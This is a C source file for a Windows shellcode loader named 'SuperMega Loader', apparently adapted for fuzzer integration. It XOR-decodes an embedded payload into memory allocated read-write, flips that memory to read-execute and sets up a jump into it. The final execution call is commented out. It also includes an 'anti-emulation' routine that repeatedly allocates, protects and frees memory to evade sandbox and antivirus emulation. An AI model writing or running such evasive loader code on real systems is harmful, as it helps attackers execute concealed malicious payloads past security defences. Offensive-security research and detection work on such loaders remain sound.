#include <windows.h>
#include <stdio.h>

/* 
 * SuperMega Loader
 * Adapted for AutoMutate++ Fuzzer Integration
 * 
 * Components:
 * - Carrier: alloc_rw_rx (VirtualAlloc RW -> Decode -> Protect RX -> Exec)
 * - Decoder: xor_2 (2-byte XOR key)
 * - AntiEmulation: sirallocalot (Allocate/Free cycle)
 * 
 * Note: Payload is embedded directly for standalone compilation.
 */

// Include auto-generated encrypted payload and keys
#include "payload.h"

// Permissions
#define p_RW  0x04
#define p_RX  0x20
#define p_RWX 0x40

// =========================================================================
// MODULE: VirtualProtect Wrapper
// =========================================================================
BOOL MyVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    // Direct call, but defined as a wrapper to allow future hooking/mutation
    return VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

// =========================================================================
// MODULE: Anti-Emulation (sirallocalot)
// =========================================================================
/* This will allocate SIR_ALLOC_COUNT RW memory regions, 
   set them to RX, and free them. 
   And this SIR_ITERATION_COUNT times.
*/
void antiemulation() {
    void* allocs[SIR_ALLOC_COUNT];
    DWORD result;

    for(int i=0; i<SIR_ITERATION_COUNT; i++) {
        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
            allocs[n] = VirtualAlloc(
                NULL, 
                PAYLOAD_LEN, 
                0x3000, // MEM_COMMIT | MEM_RESERVE
                p_RW
            );
            
            if (allocs[n]) {
                char *ptr = (char*)allocs[n];
                // write every byte of it
                for(int k=0; k<PAYLOAD_LEN; k++) {
                    ptr[k] = 0x23;
                }
            }
        }

        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
            if (allocs[n]) {
                if (MyVirtualProtect(
                    allocs[n], 
                    PAYLOAD_LEN, 
                    p_RX, 
                    &result) == 0) 
                {
                    return;
                }
            }
        }

        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
            if (allocs[n]) {
                VirtualFree(
                    allocs[n],
                    0, 
                    MEM_RELEASE
                );
            }
        }
    }
}

// =========================================================================
// MODULE: Execution Guardrail (Generic Host Check)
// =========================================================================
int executionguardrail() {
    // Placeholder: Return 0 means "safe to execute" (check passed)
    // Add env var checks here if needed for fuzzing specific conditions
    return 0; 
}

// =========================================================================
// MODULE: Decoy (None)
// =========================================================================
void decoy() {
    return;
}

// =========================================================================
// MAIN CARRIER LOGIC (alloc_rw_rx)
// =========================================================================
int main() {
    DWORD result;
    
    // 1. Guardrails
    if (executionguardrail() != 0) {
        return 1;
    }

    // 2. Anti-Emulation
    antiemulation();

    // 3. Decoy
    decoy();

    // 4. Allocate Payload Memory (RW)
    printf("[*] Allocating memory...\n");
    char *dest = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
    if (!dest) return -1;

    // 5. Copy and Decode
    // Decoder: xor_2
    printf("[*] Decrypting payload...\n");
    for(int i = 0; i < PAYLOAD_LEN; i++) {
        dest[i] = supermega_payload[i] ^ XOR_KEY2[i % 2];
    }

    // 6. Change protections (RW -> RX)
    printf("[*] Changing protection to RX...\n");
    if (MyVirtualProtect(dest, PAYLOAD_LEN, p_RX, &result) == 0) {
        return 7;
    }

    // 7. Execute
    printf("[*] Executing payload...\n");
    // In a fuzzer context, we might NOT want to actually jump if it's garbage
    // (*(void(*)())(dest))();
    
    printf("[*] Done.\n");

    return 0;
}
